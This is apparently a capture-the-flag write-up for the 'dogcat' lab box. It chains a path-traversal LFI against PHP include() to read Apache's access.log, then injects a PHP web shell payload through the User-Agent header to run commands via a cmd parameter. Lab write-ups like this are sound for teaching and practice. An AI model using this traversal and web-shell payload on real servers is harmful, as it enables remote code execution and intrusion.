### Apache Log Poisoning
`http://dogcat.thm/?view=dog/../../../../../../../var/log/apache2/access.log&ext=`

```
A misuse of the include() function in php allows me to request the access.log file as a php file, if there is php code in the file, it executes.

We use access.log because the access.log can be manipulated by web request that I send
```


Apache logs every client request in access.log, inject payload to HTTP header, `User-Agent` or `Referer` or URL path. 

Intercept the HTTP request and put the payload `<?php passthru($_GET['cmd']); ?>`.

`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0)<?php passthru($_GET['cmd']); ?> Gecko/20100101 Firefox/140.0`

Verify the payload is in the file by viewing the access.log file.

Add a cmd parameter to browser request and exploit

**Note: Remember to URL encode**
